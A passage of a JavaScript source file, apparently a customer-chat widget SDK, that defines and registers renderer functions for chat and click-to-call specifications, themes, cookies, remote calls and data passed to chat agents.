      return RenderChatThemeModel(modelObj, rule, evt, extraArgs);
    }
    throw "RenderC2cOrChatModel: Unexpected C2cOrChatModel type: " + modelObj.value;
  };
  addToJssdkRenderer('RenderC2cOrChatModel', RenderC2cOrChatModel);
  var RenderC2cSpecModel = function (modelObj) {
    return modelObj.model;
  };
  addToJssdkRenderer('RenderC2cSpecModel', RenderC2cSpecModel);
  var RenderC2cSpec = function (c2cSpecObj, rule, evt, extraArgs) {
    var resultObj = {};
    if ("c2c-spec-id" in c2cSpecObj) {
      resultObj.id = RenderNumOrVar(c2cSpecObj['c2c-spec-id'], rule, evt, extraArgs);
    }
    if ("name" in c2cSpecObj) {
      resultObj.name = RenderAbstractString(c2cSpecObj.name, rule, evt, extraArgs);
    }
    if ("plugin" in c2cSpecObj) {
      resultObj.plugin = RenderAbstractString(c2cSpecObj.plugin, rule, evt, extraArgs);
    }
    if ("c2cTheme" in c2cSpecObj) {
      resultObj.c2cTheme = RenderC2cTheme(c2cSpecObj.c2cTheme, rule, evt, extraArgs);
    }
    if ("chat-spec" in c2cSpecObj) {
      resultObj.chatSpec = RenderChatSpec(c2cSpecObj['chat-spec'], rule, evt, extraArgs);
    }
    if ("igaa" in c2cSpecObj) {
      resultObj.igaa = c2cSpecObj.igaa;
    }
    if ("dispBadge" in c2cSpecObj) {
      resultObj.dispBadge = c2cSpecObj.dispBadge;
    }
    if ("aaci" in c2cSpecObj) {
      resultObj.aaci = RenderAbstractNumber(c2cSpecObj.aaci, rule, evt, extraArgs);
    }
    if ("aaciPollCount" in c2cSpecObj) {
      resultObj.aaciPollCount = RenderAbstractNumber(c2cSpecObj.aaciPollCount, rule, evt, extraArgs);
    }
    if ("aaciMaxTime" in c2cSpecObj) {
      resultObj.aaciMaxTime = RenderAbstractNumber(c2cSpecObj.aaciMaxTime * 1000, rule, evt, extraArgs);
    }
    if ("abs" in c2cSpecObj) {
      resultObj.abs = {
        x: RenderAbstractString(c2cSpecObj.abs.x, rule, evt, extraArgs),
        y: RenderAbstractString(c2cSpecObj.abs.y, rule, evt, extraArgs)
      };
    }
    if ("peId" in c2cSpecObj) {
      resultObj.peId = RenderAbstractString(c2cSpecObj.peId, rule, evt, extraArgs);
    }
    if ("div" in c2cSpecObj) {
      resultObj.div = RenderAbstractObject(c2cSpecObj.div, rule, evt, extraArgs);
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderC2cSpec', RenderC2cSpec);
  var RenderC2cThemeModel = function (modelObj, rule, evt, extraArgs) {
    var model = modelObj.model;
    var resultObj = {
      id: RenderAbstractNumber(model.id),
      name: RenderAbstractString(model.name),
      r: model.r == null ? null : JSSDK_HELPER.globalJSVars[model.r],
      b: model.b == null ? null : JSSDK_HELPER.globalJSVars[model.b],
      ah: model.ah == null ? null : JSSDK_HELPER.globalJSVars[model.ah],
      d: model.d == null ? null : JSSDK_HELPER.globalJSVars[model.d],
      ralt: model.ralt == null ? null : JSSDK_HELPER.globalJSVars[model.ralt],
      balt: model.balt == null ? null : JSSDK_HELPER.globalJSVars[model.balt],
      ahalt: model.ahalt == null ? null : JSSDK_HELPER.globalJSVars[model.ahalt],
      dalt: model.dalt == null ? null : JSSDK_HELPER.globalJSVars[model.dalt],
      renderAsHTML: model.renderAsHTML
    };
    return resultObj;
  };
  addToJssdkRenderer('RenderC2cThemeModel', RenderC2cThemeModel);
  var RenderC2cTheme = function (c2cThemeObj, rule, evt, extraArgs) {
    var c2cTheme = c2cThemeObj.value;
    var resultObj = {};
    if ("id" in c2cTheme) {
      resultObj.id = RenderNumOrVar(c2cTheme.id, rule, evt, extraArgs);
    }
    if ("name" in c2cTheme) {
      resultObj.name = RenderAbstractString(c2cTheme.name, rule, evt, extraArgs);
    }
    if ("r" in c2cTheme) {
      resultObj.r = RenderAbstractString(c2cTheme.r);
    }
    if ("b" in c2cTheme) {
      resultObj.b = RenderAbstractString(c2cTheme.b);
    }
    if ("ah" in c2cTheme) {
      resultObj.ah = RenderAbstractString(c2cTheme.ah);
    }
    if ("d" in c2cTheme) {
      resultObj.d = RenderAbstractString(c2cTheme.d);
    }
    if ("ralt" in c2cTheme) {
      resultObj.ralt = RenderAbstractString(c2cTheme.ralt);
    }
    if ("balt" in c2cTheme) {
      resultObj.balt = RenderAbstractString(c2cTheme.balt);
    }
    if ("ahalt" in c2cTheme) {
      resultObj.ahalt = RenderAbstractString(c2cTheme.ahalt);
    }
    if ("dalt" in c2cTheme) {
      resultObj.dalt = RenderAbstractString(c2cTheme.dalt);
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderC2cTheme', RenderC2cTheme);
  var RenderCallRemote = function (crObj, rule, evt, extraArgs) {
    var callData = RenderComRemoteType(crObj.page, rule, evt, extraArgs);
    return RENDERINGCONTEXT.CRMT.create({
      doCallbackActions: function (data) {
        var extraArgs = {
          data: data
        };
        RenderActions(crObj.value, rule, evt, extraArgs);
      }
    }).callRemote(callData.url, callData.data);
  };
  addToJssdkRenderer('RenderCallRemote', RenderCallRemote);
  var RenderChatSpecModel = function (modelObj) {
    var model = modelObj.model;
    var resultObj = {
      id: model.id,
      name: RenderAbstractString(model.name),
      oId: model.oId
    };
    if (model.hasOwnProperty("buId")) resultObj.buId = model.buId;
    if (model.hasOwnProperty("stId")) resultObj.stId = model.stId;
    if (model.hasOwnProperty("ctId")) resultObj.ctId = model.ctId;
    if (model.hasOwnProperty("ael")) resultObj.ael = RenderAbstractString(model.ael);
    if (model.hasOwnProperty("svySpId")) resultObj.svySpId = model.svySpId;
    if (model.hasOwnProperty("emSpId")) resultObj.emSpId = model.emSpId;
    if (model.hasOwnProperty("aaoId")) resultObj.aaoId = model.aaoId;
    if (model.hasOwnProperty("qmspec")) resultObj.qmspec = model.qmspec;
    if (model.hasOwnProperty("an")) resultObj.an = RenderAbstractString(model.an);
    if (model.hasOwnProperty("uaa")) resultObj.uaa = model.uaa;
    if (model.hasOwnProperty("daa")) resultObj.daa = RenderAbstractString(model.daa);
    if (model.hasOwnProperty("oct")) resultObj.oct = model.oct;
    return resultObj;
  };
  addToJssdkRenderer('RenderChatSpecModel', RenderChatSpecModel);
  var RenderChatSpec = function (chatSpec, rule, evt, extraArgs) {
    var chatSpec = chatSpec.value;
    var resultObj = {};
    if ("id" in chatSpec) resultObj.id = RenderNumOrVar(chatSpec.id, rule, evt, extraArgs);
    if ("name" in chatSpec) resultObj.name = RenderAbstractString(chatSpec.name, rule, evt, extraArgs);
    if ("oId" in chatSpec) resultObj.oId = RenderAbstractNumber(chatSpec.oId, rule, evt, extraArgs);
    if ("oName" in chatSpec) resultObj.oName = RenderAbstractString(chatSpec.oName, rule, evt, extraArgs);
    if ("aId" in chatSpec) resultObj.aId = RenderAbstractString(chatSpec.aId, rule, evt, extraArgs);
    if ("aSpecId" in chatSpec) resultObj.aSpecId = RenderAbstractString(chatSpec.aSpecId, rule, evt, extraArgs);
    if ("aspecData" in chatSpec) {
      var aspecDataObj = {};
      for (var field in chatSpec.aspecData) {
        aspecDataObj[field] = RenderAbstractItem(chatSpec.aspecData[field], rule, evt, extraArgs);
      }
      resultObj.aspecData = aspecDataObj;
    }
    ;
    if ("aFields" in chatSpec) {
      var aFieldsObj = {};
      for (var field in chatSpec.aFields) {
        aFieldsObj[field] = RenderAbstractString(chatSpec.aFields[field], rule, evt, extraArgs);
      }
      resultObj.aFields = aFieldsObj;
    }
    ;
    if ("stId" in chatSpec) resultObj.stId = RenderAbstractNumber(chatSpec.stId, rule, evt, extraArgs);
    if ("ael" in chatSpec) resultObj.ael = RenderAbstractString(chatSpec.ael, rule, evt, extraArgs);
    if ("lang" in chatSpec) resultObj.lang = RenderAbstractString(chatSpec.lang, rule, evt, extraArgs);
    if ("emSpId" in chatSpec) resultObj.emSpId = RenderAbstractNumber(chatSpec.emSpId, rule, evt, extraArgs);
    if ("igaa" in chatSpec) resultObj.igaa = chatSpec.igaa;
    if ("ignHOP" in chatSpec) resultObj.ignHOP = chatSpec.ignHOP;
    if ("qmspec" in chatSpec) resultObj.qmspec = RenderAbstractNumber(chatSpec.qmspec, rule, evt, extraArgs);
    if ("chatTheme" in chatSpec) resultObj.chatTheme = RenderChatTheme(chatSpec.chatTheme, rule, evt, extraArgs);
    if ("embeddedTheme" in chatSpec) resultObj.embeddedTheme = RenderEmbeddedTheme(chatSpec.embeddedTheme, rule, evt, extraArgs);
    if ("aaoId" in chatSpec) resultObj.aaoId = RenderAbstractNumber(chatSpec.aaoId, rule, evt, extraArgs);
    if ("an" in chatSpec) resultObj.an = RenderAbstractString(chatSpec.an, rule, evt, extraArgs);
    if ("uaa" in chatSpec) resultObj.uaa = chatSpec.uaa;
    if ("daa" in chatSpec) resultObj.daa = RenderAbstractString(chatSpec.daa, rule, evt, extraArgs);
    if ("oct" in chatSpec) resultObj.oct = chatSpec.oct;
    return resultObj;
  };
  addToJssdkRenderer('RenderChatSpec', RenderChatSpec);
  var RenderChatThemeModel = function (modelObj, rule, evt, extraArgs) {
    var model = modelObj.model;
    var resultObj = {
      id: model.id,
      an: RenderAbstractString(model.an),
      fn: model.fn,
      name: model.name,
      tbh: Number(model.tbh),
      ciw: Number(model.ciw),
      cih: Number(model.cih),
      d: model.d,
      cn: RenderAbstractString(model.cn),
      dw: Number(model.dw),
      dh: Number(model.dh),
      pos: model.pos,
      lx: Number(model.lx),
      ly: Number(model.ly),
      wm: model.wm,
      px: Number(model.px),
      py: Number(model.py),
      ph: Number(model.ph),
      pw: Number(model.pw)
    };
    return resultObj;
  };
  addToJssdkRenderer('RenderChatThemeModel', RenderChatThemeModel);
  var RenderChatTheme = function (ctObj, rule, evt, extraArgs) {
    var chatTheme = ctObj.value;
    var resultObj = {};
    if ("id" in chatTheme) {
      resultObj.id = RenderNumOrVar(chatTheme.id, rule, evt, extraArgs);
    }
    if ("name" in chatTheme) {
      resultObj.name = RenderAbstractString(chatTheme.name, rule, evt, extraArgs);
    }
    if ("an" in chatTheme) {
      resultObj.an = RenderAbstractString(chatTheme.an, rule, evt, extraArgs);
    }
    if ("sv" in chatTheme) {
      resultObj.sv = chatTheme.sv;
    }
    if ("pcsID" in chatTheme) {
      resultObj.pcsID = chatTheme.pcsID;
    }
    if ("oaa" in chatTheme) {
      resultObj.oaa = chatTheme.oaa;
    }
    if ("cn" in chatTheme) {
      resultObj.cn = RenderAbstractString(chatTheme.cn, rule, evt, extraArgs);
    }
    if ("csiz" in chatTheme) {
      resultObj.csiz = RenderAbstractString(chatTheme.csiz, rule, evt, extraArgs);
    }
    if ("pos" in chatTheme) {
      if (chatTheme.pos.type == "STATIC") {
        resultObj.pos = RenderAbstractString(chatTheme.pos.value, rule, evt, extraArgs);
      } else {
        resultObj.pos = chatTheme.pos.type;
        resultObj.ly = RenderNumOrVar(chatTheme.ly, rule, evt, extraArgs);
        resultObj.lx = RenderNumOrVar(chatTheme.lx, rule, evt, extraArgs);
      }
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderChatTheme', RenderChatTheme);
  var RenderClearCookie = function (ckObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.CM.clear(RenderAbstractString(ckObj.resourceId, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderClearCookie', RenderClearCookie);
  var RenderComRemoteType = function (crtObj, rule, evt, extraArgs) {
    var comRemoteType = crtObj.value;
    var resultObj = {};
    var url = null;
    if ("url" in comRemoteType) url = RenderAbstractString(comRemoteType.url, rule, evt, extraArgs);
    if ("urlString" in comRemoteType) url = RenderAbstractString(comRemoteType.urlString, rule, evt, extraArgs);
    if ("webResourceRef" in comRemoteType) {
      var resourceId = RenderAbstractString(comRemoteType.webResourceRef, rule, evt, extraArgs);
      url = RENDERINGCONTEXT.resources[resourceId].url;
    }
    var data = null;
    if ("list" in comRemoteType) data = RenderSendItems(comRemoteType.list, rule, evt, extraArgs);
    if ("dfv" in comRemoteType) {
      var d = RenderAbstractString(comRemoteType.dfv, rule, evt);
      data = {
        data: RENDERINGCONTEXT.getDFV(d).toString()
      };
    }
    if ("item" in comRemoteType) data = RenderAbstractItem(comRemoteType.item, rule, evt, extraArgs);
    if ("map" in comRemoteType) data = RenderAbstractMap(comRemoteType.map, rule, evt, extraArgs);
    if ("obj" in comRemoteType) data = RenderAbstractObject(comRemoteType.obj, rule, evt, extraArgs);
    return {
      url: url,
      data: data
    };
  };
  addToJssdkRenderer('RenderComRemoteType', RenderComRemoteType);
  var RenderConditionalAction = function (caObj, rule, evt, extraArgs) {
    if (RenderAbstractCondition(caObj.condition, rule, evt, extraArgs)) {
      RenderActions(caObj["if-do"], rule, evt, extraArgs);
      return;
    }
    if ("else-if" in caObj) {
      for (var idx = 0; idx < caObj["else-if"].length; idx++) {
        if (RenderAbstractCondition(caObj["else-if"][idx].condition, rule, evt, extraArgs)) {
          RenderActions(caObj["else-if"][idx].actions, rule, evt, extraArgs);
          return;
        }
      }
    }
    if ("else" in caObj) {
      RenderActions(caObj["else"], rule, evt, extraArgs);
    }
  };
  addToJssdkRenderer('RenderConditionalAction', RenderConditionalAction);
  var RenderCurrentVisitorAttributes = function (cvaObj) {
    return RENDERINGCONTEXT.VAM.getCopyAsArray(cvaObj.urlEncode).join(";");
  };
  addToJssdkRenderer('RenderCurrentVisitorAttributes', RenderCurrentVisitorAttributes);
  var RenderDebugAlert = function (daObj, rule, evt, extraArgs) {
    if ("log" in daObj) {
      RENDERINGCONTEXT.log(RenderAbstractItem(daObj.log, rule, evt, extraArgs));
    }
    if ("alert" in daObj) {
      alert(RenderAbstractItem(daObj.alert, rule, evt, extraArgs));
    }
  };
  addToJssdkRenderer('RenderDebugAlert', RenderDebugAlert);
  var RenderDebugger = function (debuggerObj, rule, evt, extraArgs) {
    if (debuggerObj.debugger) {
      debugger;
    }
  };
  addToJssdkRenderer('RenderDebugger', RenderDebugger);
  var RenderDisplayInClientDiv = function (dcdObj, rule, evt, extraArgs) {
    var resultObj = {};
    resultObj.divId = RenderAbstractString(dcdObj.divId, rule, evt, extraArgs);
    if (dcdObj.hasOwnProperty("ruleCtxBuId")) {
      resultObj.ruleCtxBuId = dcdObj.ruleCtxBuId;
    } else {
      resultObj.ruleCtxBuId = null;
    }
    resultObj.url = RenderAbstractString(dcdObj.url, rule, evt, extraArgs);
    if (dcdObj.hasOwnProperty("method")) {
      resultObj.method = dcdObj.method;
    } else {
      resultObj.method = null;
    }
    resultObj.item = RenderSendItems(dcdObj.item, rule, evt, extraArgs);
    return RENDERINGCONTEXT.XFormsLoader.showInClientDiv(resultObj.divId, rule, resultObj.ruleCtxBuId, resultObj.url, resultObj.item, resultObj.method);
  };
  addToJssdkRenderer('RenderDisplayInClientDiv', RenderDisplayInClientDiv);
  var RenderDisplay = function (displayObj, rule, evt, extraArgs) {
    var resultObj = {};
    resultObj.container = RenderAbstractString(displayObj.displayContainer, rule, evt, extraArgs);
    resultObj.initiator = {
      type: "br",
      id: rule.getID()
    };
    resultObj.buId = rule.getBusinessUnitID();
    if (displayObj.displayContainer.declaredType.simpleName == "Xframe") {
      resultObj.url = Inq.urls.xFormsDomain + RenderAbstractString(displayObj.url, rule, evt, extraArgs);
      Inq.FlashPeer.showAutomaton(resultObj.container.id, resultObj.url, resultObj.buId, resultObj.initiator);
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderDisplay', RenderDisplay);
  var RenderDoActionList = function (dalObj, rule, evt, extraArgs) {
    if (dalObj["is-rule"]) {
      return Inq.doRuleActionList(RenderAbstractString(dalObj.actionId), rule, evt, extraArgs);
    } else {
      return Inq.doBusinessRuleActionList(RenderAbstractString(dalObj.actionId), rule, evt, extraArgs);
    }
  };
  addToJssdkRenderer('RenderDoActionList', RenderDoActionList);
  var RenderExecuteCustomJs = function (ecjObj, rule, evt) {
    result = RENDERINGCONTEXT.FM.callExternalHelperSafe("JSSDK_HELPER.helperCustomJSFunction." + ecjObj.customJs, null, true);
    return result;
  };
  addToJssdkRenderer('RenderExecuteCustomJs', RenderExecuteCustomJs);
  var RenderFireCustomEvent = function (fceObj, rule, evt, extraArgs) {
    var flag = fceObj.inMainContextOnly ? fceObj.inMainContextOnly : false;
    return RENDERINGCONTEXT.EVM.fireCustomEvent(fceObj['eventName'], rule, evt, function () {
      if ("evt-data-def" in fceObj) {
        return RenderEvtDataDef(fceObj["evt-data-def"], rule, evt, extraArgs);
      }
      if ("map" in fceObj) {
        return Array.prepareMapToSerialize(RenderAbstractMap(fceObj.map, rule, evt, extraArgs));
      }
      return {};
    }, flag);
  };
  addToJssdkRenderer('RenderFireCustomEvent', RenderFireCustomEvent);
  var RenderSendItems = function (obj, rule, evt, extraArgs) {
    var resultObj = {};
    for (var key in obj) {
      resultObj[RenderAbstractString(key)] = RENDERINGCONTEXT.pd1d(RenderAbstractItem(obj[key], rule, evt, extraArgs));
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderSendItems', RenderSendItems);
  var RenderJumpToPage = function (jtpObj, rule, evt, extraArgs) {
    var sourceUrl = null;
    if ("url" in jtpObj) {
      sourceUrl = RenderAbstractString(jtpObj.url, rule, evt, extraArgs);
    }
    if ("webResource" in jtpObj) {
      var webResource = RenderAbstractString(jtpObj.webResource, rule, evt, extraArgs);
      sourceUrl = RENDERINGCONTEXT.resources[webResource].url;
    }
    return RENDERINGCONTEXT.FP.PushToFrameset(sourceUrl, "_self");
  };
  addToJssdkRenderer('RenderJumpToPage', RenderJumpToPage);
  var RenderLaunchMonitor = function (lmObj, rule, evt, extraArgs) {
    var serviceType = lmObj.serviceType;
    return RENDERINGCONTEXT.CHM.request(rule, RENDERINGCONTEXT.CHM.CHAT_TYPES.serviceType, RenderChatSpec(lmObj.chatSpec, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderLaunchMonitor', RenderLaunchMonitor);
  var RenderLogToServer = function (ltsObj, rule, evt, extraArgs) {
    var abstractString = RenderAbstractString(ltsObj.abstractString, rule, evt, extraArgs);
    return RENDERINGCONTEXT.lmt12(abstractString, ltsObj.value);
  };
  addToJssdkRenderer('RenderLogToServer', RenderLogToServer);
  var RenderLog = function (logObj, rule, evt, extraArgs) {
    var result = {};
    result.value = RenderAbstractString(logObj.value, rule, evt, extraArgs);
    if ("level" in logObj) {
      result.level = logObj.level;
    }
    return RENDERINGCONTEXT.log(result.value, result.level);
  };
  addToJssdkRenderer('RenderLog', RenderLog);
  var RenderMapClear = function (mcObj, rule, evt, extraArgs) {
    return RenderAbstractMap(mcObj.mapName, rule, evt, extraArgs).clear();
  };
  addToJssdkRenderer('RenderMapClear', RenderMapClear);
  var RenderMapEach = function (meObj, rule, evt, extraArgs) {
    var result = {};
    result.mapName = RenderAbstractMap(meObj.mapName, rule, evt, extraArgs);
    if ("fncName" in meObj) {
      result.fncName = RenderAbstractFunction(meObj.fncName, false);
    }
    return result.mapName.each(result.fncName);
  };
  addToJssdkRenderer('RenderMapEach', RenderMapEach);
  var RenderMapSet = function (msObj, rule, evt, extraArgs) {
    return RenderAbstractMap(msObj.mapName, rule, evt, extraArgs).set(RenderAbstractItem(msObj.key, rule, evt, extraArgs), RenderAbstractItem(msObj.value, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderMapSet', RenderMapSet);
  var RenderMapUnset = function (msObj, rule, evt, extraArgs) {
    return RenderAbstractMap(msObj.mapName, rule, evt, extraArgs).unset(RenderAbstractItem(msObj.key, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderMapUnset', RenderMapUnset);
  var RenderModels = function (modlesObj) {
    var resultObj = {};
    for (var key in modlesObj) {
      resultObj[key] = RenderC2cOrChatModel(modlesObj[key]);
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderModels', RenderModels);
  var RenderNumOrVar = function (nvObj, rule, evt) {
    return RenderAbstractNumber(nvObj, rule, evt);
  };
  addToJssdkRenderer('RenderNumOrVar', RenderNumOrVar);
  var RenderPopoutWindow = function (pwObj, rule, evt, extraArgs) {
    var resourceId = RenderAbstractString(pwObj.resourceId, rule, evt, extraArgs);
    var windowName = RenderAbstractString(pwObj.windowName, rule, evt, extraArgs);
    var value = pwObj.value == null ? null : RenderAbstractItem(pwObj.value, rule, evt, extraArgs);
    var features = pwObj.features == null ? null : RenderAbstractString(pwObj.features, rule, evt, extraArgs);
    return RENDERINGCONTEXT.SVYM.popwindow(resourceId, windowName, value, features);
  };
  addToJssdkRenderer('RenderPopoutWindow', RenderPopoutWindow);
  var RenderPublishJsApiFunction = function (pjafObj, rule, evt, extraArgs) {
    var result = {};
    result.jsApi = RenderAbstractString(pjafObj.jsApi, rule, evt, extraArgs);
    result.varId = RenderAbstractString(pjafObj.varId, rule, evt, extraArgs);
    if ("ruleId" in pjafObj) {
      result.ruleId = RenderAbstractNumber(pjafObj.ruleId, rule, evt, extraArgs);
    }
    return RENDERINGCONTEXT.publishAPI(result.jsApi, result.varId, result.ruleId);
  };
  addToJssdkRenderer('RenderPublishJsApiFunction', RenderPublishJsApiFunction);
  var RenderResetCookie = function (rcObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.PM.reset(RenderAbstractString(rcObj.resourceId, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderResetCookie', RenderResetCookie);
  var RenderSendDataToAgent = function (rsdaObj, rule, evt, extraArgs) {
    var result = {};
    if ("agentID" in rsdaObj) result.agentID = RenderAbstractString(rsdaObj.agentID, rule, evt, extraArgs);else result.agentID = RENDERINGCONTEXT.CHM.getAgentID();
    if ("engagementID" in rsdaObj) result.engagementID = RenderAbstractString(rsdaObj.engagementID, rule, evt, extraArgs);else result.engagementID = RENDERINGCONTEXT.CHM.getChatID();
    if ("items" in rsdaObj) {
      var items = RenderSendItems(rsdaObj.items, rule, evt, extraArgs);
      items.agentID = result.agentID;
      items.engagementID = result.engagementID;
      return RENDERINGCONTEXT.ROM.sendDataToAgent(result.agentID, items);
    } else if ("dataFilterViewRef" in rsdaObj) {
      var dfv = {};
      dfv[rsdaObj.dataFilterViewRef.id] = (v3Lander.isWebSDK ? window.Inq.datapass : window.parent.Inq.datapass) || RENDERINGCONTEXT.getDFV(rsdaObj.dataFilterViewRef.id).toString();
      dfv.passDFVId = rsdaObj.dataFilterViewRef.passDFVId;
      dfv.agentID = result.agentID;
      dfv.engagementID = result.engagementID;
      return RENDERINGCONTEXT.ROM.sendDataToAgent(result.agentID, dfv);
    } else if ("abstractObject" in rsdaObj) {
      var obj = RENDERINGCONTEXT.MI8.mixMutatable(RenderAbstractObject(rsdaObj.abstractObject, rule, evt)).set("agentID", result.agentID).set("engagementID", result.engagementID);
      return RENDERINGCONTEXT.ROM.sendDataToAgent(result.agentID, obj);
    } else {
      return RENDERINGCONTEXT.ROM.sendDataToAgent(result.agentID, null);
    }
  };
  addToJssdkRenderer('RenderSendDataToAgent', RenderSendDataToAgent);
  var RenderSendData = function (sdObj, rule, evt, extraArgs) {
    try {
      var comRemote = RenderComRemoteType(sdObj['com-remote'], rule, evt, extraArgs);
      var logOnError = sdObj.logOnError;
      var resendOnError = sdObj.resendOnError;
      var maxResendTimes = null;
      if ("maxResendTimes" in sdObj) maxResendTimes = sdObj.maxResendTimes;
      var timeout = null;
      if ("timeout" in sdObj) timeout = sdObj.timeout;
      return RENDERINGCONTEXT.ROM.send(comRemote.url, comRemote.data, logOnError, resendOnError, maxResendTimes, timeout);
    } catch (e) {
      RENDERINGCONTEXT.lmt12("Error occurred when trying to send data to TagServer " + RENDERINGCONTEXT.cf21(e), RENDERINGCONTEXT.LOG_LEVELS.ERROR);
    }
  };
  addToJssdkRenderer('RenderSendData', RenderSendData);
  var RenderSetBooleanVar = function (sbvObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.PM.getVar(RenderAbstractString(sbvObj.varID, rule, evt, extraArgs), rule).z3(RenderAbstractCondition(sbvObj.cond, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderSetBooleanVar', RenderSetBooleanVar);
  var RenderSetDateVar = function (sdvObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.PM.getVar(RenderAbstractString(sdvObj.varID, rule, evt, extraArgs), rule).z3(RenderAbstractDate(sdvObj.date, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderSetDateVar', RenderSetDateVar);
  var RenderSetExitHook = function (sehObj, rule, evt, extraArgs) {
    if (extraArgs && extraArgs.initObj) {
      return Inq.EH.doInit(extraArgs.initObj);
    } else {
      throw "RenderSetExtHook: initObj not passed in extraArgs.";
    }
  };
  addToJssdkRenderer('RenderSetExitHook', RenderSetExitHook);
  var RenderSetNumberVar = function (snvObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.PM.getVar(RenderAbstractString(snvObj.varID, rule, evt, extraArgs), rule).z3(RenderAbstractNumber(snvObj.num, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderSetNumberVar', RenderSetNumberVar);
  var RenderSetObjectVar = function (sovObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.PM.getVar(RenderAbstractString(sovObj.varID, rule, evt, extraArgs), rule).z3(RenderAbstractObject(sovObj.abstractObject, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderSetObjectVar', RenderSetObjectVar);
  var RenderSetPersistentCustomerId = function (spciObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.setPersistCustID(RenderAbstractObject(spciObj.value, rule, evt, extraArgs), Boolean(spciObj.secure), Boolean(spciObj.allowEmptyValues));
  };
  addToJssdkRenderer('RenderSetPersistentCustomerId', RenderSetPersistentCustomerId);
  var RenderSetAuthenticatedUser = function (pciObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.setAuthUser(pciObj.persistentCustomerId ? RenderAbstractObject(pciObj.persistentCustomerId, rule, evt, extraArgs) : null, pciObj.simpleObject ? RenderAbstractObject(pciObj.simpleObject, rule, evt, extraArgs) : null);
  };
  addToJssdkRenderer('RenderSetAuthenticatedUser', RenderSetAuthenticatedUser);
  var RenderSetPriority = function (spObj, rule, evt, extraArgs) {
    return this.setPriority(RenderAbstractNumber(spObj.value, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderSetPriority', RenderSetPriority);
  var RenderSetStringVar = function (spObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.PM.getVar(RenderAbstractString(spObj.varID, rule, evt, extraArgs), rule).z3(RenderAbstractString(spObj.str, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderSetStringVar', RenderSetStringVar);
  var RenderSetUserObject = function (spciObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.setUserObject(RenderAbstractObject(spciObj.value, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderSetUserObject', RenderSetUserObject);
  var RenderShowC2Call = function (obj, rule, evt, extraArgs) {
    var serviceType = obj.serviceType;
    var result = RenderC2cSpec(obj.c2cSpec, rule, evt, extraArgs);
    if (!result.clickToPersistent) {
      result.clickToPersistent = obj.clickToPersistent;
    }
    if ("optDataPass" in obj) {
      result.optDataPass = function (evt) {
        RenderAction(obj.optDataPass, rule, evt, extraArgs);
      };
    }
    if ("clickToPersistent" in obj && "useNative" in obj) {
      return RENDERINGCONTEXT.C2CM.request(rule, RENDERINGCONTEXT.CHM.CHAT_TYPES[serviceType], function (rule) {
        return result;
      }, result.clickToPersistent, result.useNative);
    } else if ("clickToPersistent" in obj) {
      return RENDERINGCONTEXT.C2CM.request(rule, RENDERINGCONTEXT.CHM.CHAT_TYPES[serviceType], function (rule) {
        return result;
      }, result.clickToPersistent);
    } else if ("useNative" in obj) {
      return RENDERINGCONTEXT.C2CM.request(rule, RENDERINGCONTEXT.CHM.CHAT_TYPES[serviceType], function (rule) {
        return result;
      }, result.useNative);
    } else {
      return RENDERINGCONTEXT.C2CM.request(rule, RENDERINGCONTEXT.CHM.CHAT_TYPES[serviceType], function (rule) {
        return result;
      });
    }
  };
  addToJssdkRenderer('RenderShowC2Call', RenderShowC2Call);
  var RenderShowConversive = function (scObj, rule, evt, extraArgs) {
    var result = {
      rule: rule,
      chatType: RENDERINGCONTEXT.CHM.CHAT_TYPES.CONVERSIVE,
      agtid: scObj.agtid,
      chatSpec: RenderChatSpec(scObj.chatSpec, rule, evt, extraArgs),
      flashvarFcn: function () {
        return {
          iframeURL: scObj.iframeURL
        };
      }
    };
    if ("action" in scObj) {
      result.onAgentAssigned = function (evt) {
        RenderActions(scObj.action, rule, evt, extraArgs);
      };
    }
    return RENDERINGCONTEXT.SL1.c(result).request();
  };
  addToJssdkRenderer('RenderShowConversive', RenderShowConversive);
  var RenderShowExitConfirmation = function (secObj, rule, evt, extraArgs) {
    var businessUnitId = secObj.businessUnitId == null ? null : RenderAbstractNumber(secObj.businessUnitId, rule, evt, extraArgs);
    if ("pollInterval" in secObj) {
      return Inq.EC.doInit(this, secObj.alertMsg, secObj.chatImg, secObj.confirmDialogMsg, secObj.checkAgentAvailability, businessUnitId, secObj.pollInterval);
    }
    return Inq.EC.doInit(this, secObj.alertMsg, secObj.chatImg, secObj.confirmDialogMsg, secObj.checkAgentAvailability, businessUnitId);
  };
  addToJssdkRenderer('RenderShowExitConfirmation', RenderShowExitConfirmation);
  var RenderShowExternalChat = function (secObj, rule, evt, extraArgs) {
    var serviceType = secObj.serviceType;
    var result = RenderC2cSpec(secObj.c2cSpec, rule, evt, extraArgs);
    if ("optDataPass" in secObj) {
      result.optDataPass = function (evt) {
        RenderAbstractAction(secObj.optDataPass, rule, evt, extraArgs);
      };
    }
    result.launchJS = secObj.extC2cjs.split('.').reduce(function reducer(obj, i) {
      return obj[i];
    }, window);
    if ("clickToPersistent" in secObj) {
      result.clickToPersistent = secObj.clickToPersistent;
      return RENDERINGCONTEXT.C2CM.requestExtLauncher(rule, RENDERINGCONTEXT.CHM.CHAT_TYPES[serviceType], function (rule) {
        return result;
      }, result.clickToPersistent);
